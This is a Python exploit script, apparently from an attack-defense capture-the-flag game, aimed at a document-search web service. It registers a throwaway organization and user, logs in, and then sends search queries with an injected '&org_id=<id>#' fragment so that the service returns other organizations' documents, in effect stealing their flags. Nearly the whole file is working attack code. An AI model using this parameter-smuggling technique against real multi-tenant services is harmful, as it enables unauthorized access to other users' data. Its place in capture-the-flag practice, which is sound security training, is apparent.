#!/usr/bin/env python3

import random
import sys
import json

import checklib

class DocLib:
    def __init__(self, host: str):
        self.host = host
        self.session = checklib.get_initialized_session()

    def create_org(self, domain: str):
        document = {
            "domain": domain,
        }

        response = self.session.post(
            f"{self.host}/api/organizations",
            json=document
        )
        response.raise_for_status()
        return response.json()

    def create_user(self, username: str, password: str, token: str):
        document = {
            "username": username,
            "password": password,
            "token": token
        }

        response = self.session.post(
            f"{self.host}/api/users",
            json=document
        )
        response.raise_for_status()
        return response.json()

    def login(self, username: str, password: str):
        document = {
            "email": username,
            "password": password
        }

        response = self.session.post(
            f"{self.host}/api/login",
            json=document
        )
        response.raise_for_status()
        token_data =  response.json()
        token = token_data.get('token')
        self.session.headers['Authorization'] = f"Bearer {token}"

    def search(self, query: str):
        response = self.session.get(
            f"{self.host}/api/documents",
            params={'query': query}
        )
        response.raise_for_status()
        return response.json()

if len(sys.argv) != 3:
    print("Usage: python3 canonical_meme.py <ip> <attack_data>")
    sys.exit(1)

ip = sys.argv[1]
attack_data = sys.argv[2]

attack_data = json.loads(attack_data)


lib = DocLib(f"http://{ip}:8000")
pocs = random.randint(0, 10000)
org_name = f'exploit{pocs}.ru'
org = lib.create_org(org_name)
token = org.get('token')
username, pwd = checklib.rnd_username(), checklib.rnd_password()
lib.create_user(username, pwd, token)
lib.login(f'{username}@{org_name}', pwd)
for p in attack_data:
    org, org_id, doc_id = p.split(':')
    print(lib.search(f'&org_id={org_id}#'))
